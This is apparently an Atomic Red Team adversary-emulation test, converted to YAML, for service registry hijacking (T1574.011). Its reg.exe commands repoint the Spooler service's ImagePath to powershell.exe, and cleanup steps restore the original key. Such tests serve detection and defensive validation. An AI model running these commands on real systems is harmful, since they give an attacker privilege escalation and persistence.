# Converted from Atomic Red Team - Hijack Execution Flow: Services Registry Permissions Weakness
# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1574.011
# Original auto_generated_guid: f38e9eea-e1d7-4ba6-b716-584791963827

---
api_version: 2.0
uuid: adb56f4c-6bb0-41d6-a91d-be9642c8cc52
name: Service ImagePath Change with reg.exe
authors:
  - isaac_fletcher
  - Atomic Red Team
description: |
  Change Service registry ImagePath of a benign service to a malicious file.
  This test backs up the original service configuration and restores it during cleanup.

mitre:
  tactics:
    - "TA0004 Privilege Escalation"
    - "TA0003 Persistence"
  techniques:
    - "T1574 Hijack Execution Flow"
  subtechniques:
    - "T1574.011 Services Registry Permissions Weakness"

requirements:
  platforms:
    - os: windows
  superuser: true

args:
  - name: weak_service_name
    description: weak service name
    type: string
    default: "spooler"
  - name: weak_service_path
    description: weak service path
    type: path
    default: "C:\\Windows\\system32\\spoolsv.exe"
  - name: malicious_service_path
    description: malicious service path
    type: path
    default: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
  - name: backup_file_path
    description: Path where service registry backup will be stored
    type: path
    default: "C:\\Users\\Public\\service_backup.reg"

steps:
  - name: backup_service_registry
    executor: cmd.exe
    inline: |
      reg.exe export "HKLM\SYSTEM\CurrentControlSet\Services\{{.Args.weak_service_name}}" "{{.Args.backup_file_path}}" /y
    cleanup:
      executor: cmd.exe
      inline: |
        del "{{.Args.backup_file_path}}" /f

  - name: modify_service_imagepath
    executor: cmd.exe
    inline: |
      reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\{{.Args.weak_service_name}}" /f /v ImagePath /d "{{.Args.malicious_service_path}}"
    cleanup:
      executor: cmd.exe
      inline: |
        reg.exe import "{{.Args.backup_file_path}}"
